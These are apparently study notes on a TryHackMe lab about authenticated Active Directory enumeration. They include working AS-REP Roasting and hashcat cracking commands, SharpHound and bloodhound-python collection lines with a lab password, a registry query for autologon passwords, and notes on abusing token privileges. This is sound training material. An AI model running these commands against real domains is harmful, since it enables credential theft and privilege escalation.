# AD: Authenticated Enumeration

**Room Name:** AD: Authenticated Enumeration
**Platform:** TryHackMe
**Date:** June 24, 2026

---

## Overview

This room covers authenticated enumeration techniques against Active Directory environments, progressing from AS-REP Roasting, through native Windows CMD/PowerShell living-off-the-land (LOTL) enumeration, to the ActiveDirectory PowerShell module, PowerView, and BloodHound/SharpHound for graph-based AD attack path mapping.

---

## Task 1: AS-REP Roasting

AS-REP Roasting targets user accounts with Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`). Unlike Kerberoasting, the targeted accounts do not need to be service accounts.

### How It Works
- Normally, the KDC verifies a user's identity by decrypting an encrypted timestamp using the user's password hash.
- If pre-authentication is disabled, the KDC skips this check and returns an encrypted AS-REP blob without verifying identity first.
- This blob can be captured and cracked offline to recover the account's plaintext password.

### Phase 1 — Enumeration (Identify Vulnerable Accounts)

**Tools:**
| Tool | Platform | Notes |
|---|---|---|
| Rubeus | Windows only | `Rubeus.exe asreproast` — auto-identifies vulnerable accounts and retrieves AS-REP hashes |
| Impacket `GetNPUsers.py` | Linux/Windows | Requires a `users.txt` file of candidate usernames |

**Example Command (Impacket):**
```bash
GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```

**Creating `users.txt` on the AttackBox:**
```bash
cat > users.txt
# paste usernames, then press Ctrl+D
cat users.txt   # confirm file contents
```

### Phase 2 — Exploitation (Crack the Hashes)

**Tool:** Hashcat (cross-platform), mode `18200` for AS-REP hashes.

```bash
hashcat -m 18200 hashes.txt wordlist.txt
```

- `-m 18200`: AS-REP Kerberos hash cracking mode
- `hashes.txt`: collected hashes from vulnerable accounts
- `wordlist.txt`: dictionary of candidate passwords (e.g., `/usr/share/wordlists/rockyou.txt`)

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Task 2/3: Manual Enumeration (Native CMD & PowerShell)

Manual, "living off the land" (LOTL) enumeration uses built-in Windows tools (`net`, `whoami`, etc.) — blending in with normal admin activity and avoiding extra tooling.

### Who Am I?

```cmd
whoami
```
Shows the current domain/user context: `DomainName\DomainUser` (domain account) vs. `ComputerName\LocalUser` (local account).

```cmd
whoami /all
```
Returns the account's SID, group memberships, and privileges.

#### Key Privileges to Look For

| Privilege | Significance |
|---|---|
| `SeImpersonatePrivilege` | Allows impersonating another authenticated user's token — abused by "potato" attacks to gain SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | Assigns another user's primary token to a new process; used with `SeImpersonatePrivilege` |
| `SeBackupPrivilege` | Read any file regardless of permissions — can dump SAM/SYSTEM hives |
| `SeRestorePrivilege` | Write any file/registry key regardless of permissions — can overwrite critical system files |
| `SeDebugPrivilege` | Attach a debugger to any process — enables LSASS memory dumping for credential theft |

### System and Domain Information

```cmd
hostname
systeminfo                                  :: requires admin privileges
systeminfo | findstr /B "OS"
systeminfo | findstr /B "Domain"
set                                          :: environment variables (CMD)
Get-ChildItem Env:                           :: PowerShell equivalent
dir env:                                     :: PowerShell shorthand
```
Note: `USERDOMAIN` equals the computer name unless the machine is domain-joined.

### Enumerating Users and Groups — NET Commands

```cmd
net help
net user /domain                             :: list domain users
net group /domain                            :: list domain groups
net group "Domain Computers" /domain         :: list computer accounts (end in $)
net group "Domain Admins" /domain            :: list Domain Admins members
net localgroup                               :: list local groups
net localgroup Administrators                :: list local Administrators members
```

**Domain groups worth inspecting:**
- Domain Admins / Administrators
- Enterprise Admins
- Server Operators / Backup Operators
- Any group containing "Admin" in its name

### Logged-on Users and Sessions

```cmd
query user            :: or "quser"
tasklist               :: running processes (use /V for verbose)
tasklist /V
net session            :: SMB sessions (requires admin privileges)
```
A logged-on administrator is a strong signal for credential/token theft (e.g., LSASS dumping, Mimikatz, token impersonation if `SeImpersonatePrivilege` is held).

### Identifying Service Accounts

```cmd
wmic service get
wmic service get Name,StartName       :: requires admin privileges
```
`SERVICE_START_NAME` reveals the account each service runs as.

### Environment Variables and Registry

- Environment variables (e.g., `JAVA_HOME`) can hint at installed software/dev tools.
- Saved auto-logon credentials may exist at:
  `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
  - Check `DefaultPassword` and whether `AutoAdminLogon` is set to `1`.

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v <keyword>
```

---

## Task 4: BloodHound & SharpHound

### Background
BloodHound (SpecterOps, released 2016) introduced graph-based AD analysis, shifting enumeration from static lists to relationship mapping.

> "Defenders think in lists. Attackers think in graphs." — John Lambert

### Two-Stage Attack Model

| Stage | Description |
|---|---|
| 1. Enumeration | Collectors (SharpHound / BloodHound-python) gather sessions, group memberships, ACLs, and delegation settings |
| 2. Targeted Attack | Offline graph analysis identifies efficient paths to objectives (e.g., Domain Admin), enabling fast lateral movement on re-entry |

### Modern Capabilities
- **AzureHound** — extends enumeration to Azure Entra ID alongside on-prem AD
- **RBCD primitives** — detection of Resource-Based Constrained Delegation paths (`AddAllowedToAct`, `AllowedToAct`)
- **Butterfly algorithm** — improved risk scoring/prioritization
- Also used defensively (BloodHound Enterprise) to find and remediate excessive privilege/misconfigurations proactively

### Data Collectors

| Collector | Language/Platform | Notes |
|---|---|---|
| `SharpHound.exe` | C# / Windows | Standard, recommended method; can be flagged by Defender |
| `AzureHound.ps1` | PowerShell | Azure Entra ID-specific enumeration |
| `SharpHound.ps1` | PowerShell (Deprecated) | Formerly used for in-memory/stealth execution |
| `BloodHound.py` | Python / Linux | Community-supported (not official), auths via creds/NTLM/Kerberos, outputs JSON/ZIP |

⚠️ BloodHound and SharpHound versions must match for compatible ingestion.

**Example Commands:**
```cmd
.\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
```
```bash
bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns 10.211.12.10 -c All --zip
```

---

## Task 5: ActiveDirectory PowerShell Module

```powershell
Import-Module ActiveDirectory
```

### User Enumeration
```powershell
Get-ADUser -Filter *
Get-ADUser -Identity <username>
Get-ADUser -Identity <username> -Properties *
Get-ADUser -Filter "Name -like 'admin'"
```
Useful properties: `LastLogonDate` (account activity), `MemberOf` (groups), `Description` (notes), `Title` (job role).

### Group Enumeration
```powershell
Get-ADGroup -Filter *
Get-ADGroup -Filter * | Select Name
Get-ADGroupMember -Identity "Remote Management Users"
Get-ADGroupMember -Identity "Domain Admins"
```

### Computer Enumeration
```powershell
Get-ADComputer -Filter *
Get-ADComputer -Filter * | Select Name, OperatingSystem
```

### Other Useful Commands
```powershell
Get-ADDefaultDomainPasswordPolicy
```

---

## Task 6: PowerView (PowerSploit)

PowerView is part of the **PowerSploit** framework, written in PowerShell, used for domain enumeration and trust relationship discovery — an evolution of `net user` / `net group`.

**Location (example):**
```
C:\Users\asrepuser1\Downloads\PowerSploit-master\Recon
```

**Loading the module:**
```powershell
Import-Module .\PowerView.ps1
```
A clean import shows no errors.

### User Enumeration
```powershell
Get-DomainUser
```

### Group Enumeration
```powershell
Get-DomainGroup
Get-NetGroup
Get-DomainGroup "admin"     :: filter groups containing "admin"
```

---

## Key Takeaways

- AS-REP Roasting requires only `UF_DONT_REQUIRE_PREAUTH` to be set — no service account needed.
- Native tools (`net`, `whoami`, `wmic`, `reg`) enable stealthy, LOTL-style enumeration that blends in with normal admin activity.
- Privileges like `SeImpersonatePrivilege` and `SeDebugPrivilege` are high-value findings during post-exploitation.
- BloodHound/SharpHound shifted AD attack methodology from list-based to graph-based analysis, dramatically speeding up path-finding to privileged targets.
- The ActiveDirectory module and PowerView both provide richer, filterable alternatives to legacy `net` commands for deeper domain enumeration.
